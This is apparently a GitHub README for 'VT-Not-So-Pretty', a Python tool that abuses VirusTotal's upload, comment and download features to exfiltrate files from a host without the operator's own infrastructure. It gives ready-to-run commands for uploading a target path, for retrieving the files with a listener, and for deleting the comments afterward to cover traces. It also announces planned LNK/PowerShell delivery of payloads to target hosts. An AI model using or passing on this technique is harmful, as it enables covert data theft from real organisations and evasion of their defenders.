# VT-Not-So-Pretty

Python data exfiltration tool that uses VirusTotal as its infrastructure.

As defenders we are often overwhelmed by the sheer amount of network traffic in a network and overlook traffic made to well known trusted sites without any known suspicious functionalities (like file/software sharing sites). And what other site is more well known and trusted to defenders than virustotal.  

My main goal was to use VirusTotal upload and download functionalities to transfer files back and forth without the need to use our own infrastructure, and breaking the diamond model from the defender's perspective. 

## Usage Example
The tool is pretty simple just provide it a path, your VT API key, and a hash of a file (already uploaded to VT) to which you want the hashes of the files exfiltrated to be written, so they can be downloaded later.    

```
python .\Vt-Not-So-Pretty.py -f "PATH_TO_EXFIL" -k YOUR_API_KEY -c HASH_TO_COMMENT_ON
```
Alternatively you can enter this when prompted:

![Vy-Not-So-Pretty](https://github.com/user-attachments/assets/780fec17-50da-4aef-a91e-d3682be5c573)


After done uploading the files to VT all you have to do is just run listener as follows:

```
python VT-Listener.py -f C:\Path\to\save\files\to -k "YOUR_PREMIUM_API_KEY" -c "HASH_TO_CHECK_COMMENTS_ON"
```
Or you can also enter this when prompted:

![image](https://github.com/user-attachments/assets/9b8454a3-d486-4ef8-866d-a1b53a21c081)

## Optional Cleanup
If you wish to delete the comments after file download (to clean up as much as possible), all you have to do is provide the listener with the API key used by the first tool as follows:
```
python VT-Listener.py -f C:\Path\to\save\files\to -k "YOUR_PREMIUM_API_KEY" -c "HASH_TO_CHECK_COMMENTS_ON -d "THE_API_KEY_USED_4_UPLOAD"
```

## Main Drawbacks:

1. The file sizes to transfer are limited to 650 MB per file - This could be solved with proper file splitting and compression.

2. Premium Subscription - In order to download files from VT, a premium subscription is needed, which can be quite expensive.

## Disclaimer

This is an ongoing project, and in the future, I am planning to add more tools to it, for other uses as well, like for delivery using LNK files that contain a powershell code that download (or read in memory) file from VT and runs them on the target host.

## Upcoming Updates:
Changing the endpoint to upload files larger than 35 MB.

